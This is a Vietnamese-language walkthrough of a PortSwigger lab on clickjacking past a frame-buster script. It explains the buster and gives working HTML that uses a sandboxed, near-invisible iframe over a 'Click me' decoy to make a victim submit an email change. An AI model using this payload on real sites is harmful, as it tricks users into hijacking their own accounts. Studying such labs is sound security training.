# Clickjacking with a frame buster script

Chức năng thay đổi email vẫn là một form đơn giản như các challenge trước nhưng lần này đã có biện pháp bảo vệ 

```html
<p>Your username is: wiener</p>
<p>Your email is: wiener@normal-user.net</p>
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="">
<script>
    if(top != self) {
    window.addEventListener("DOMContentLoaded", function() {
    document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
</script>
<input required type="hidden" name="csrf" value="bDdr2OiVchDzxn9zbAULDJ5WObwd9XnP">
<button class='button' type='submit'> Update email </button>
</form>
```

Đoạn mã này sẽ kiểm tra cửa sổ chính của nó và cửa sổ trên cùng xem có giống nhau không, nếu giống thì nó sẽ thay thế toàn bo nội dung của trang bằng một tin nhắn văn bản `This page cannot be framed`

![image](https://user-images.githubusercontent.com/68894302/175192668-b29cc142-90d3-485a-90be-e537c07b8c5f.png)

Vì thế cần một cách để ngăn tập lệnh từ trang bị đóng khung không chạy được hoặc không thể truy cập vào ngữ cảnh trình duyệt. Search google thấy có một số tip trên [stackoverflow](https://stackoverflow.com/questions/369498/how-to-prevent-iframe-from-redirecting-top-level-window) và [w3schools](https://www.w3schools.com/tags/att_iframe_sandbox.asp)

Trên tài liệu iframe sandbox, các giá trị có thể có của thuộc tính sandbox được liệt kê:

![image](https://user-images.githubusercontent.com/68894302/175193376-1d38615f-e66e-452a-9ad7-d44cfe2200a3.png)

Khi muốn người dùng thay đổi email chúng ta cần cấp quyền `allow-forms` 

## Craft script html

``` html
<style>
    #vuln_site{
        position:relative;
        width:1000px;
        height:800px;
        opacity:0.1;
        z-index:2;
    }
    #evil_site{
        position:absolute;
        top:470px;
        left:60px;
        z-index:1;
    }
</style>
<div id="evil_site">Click me</div>
<iframe sandbox="allow-forms" id="vuln_site" src="https://0a8100cb032d2fcec00741f200320042.web-security-academy.net/my-account/?email=hacker@net">
</iframe>
```

![image](https://user-images.githubusercontent.com/68894302/175193983-ad07e339-90b1-43ac-8051-3d93380ac115.png)

Sửa lai độ mờ opacity xuống 0.000001 và delivery exploit -> solved

![image](https://user-images.githubusercontent.com/68894302/175194223-289225bb-d1d9-4913-9b65-006ad06a510a.png)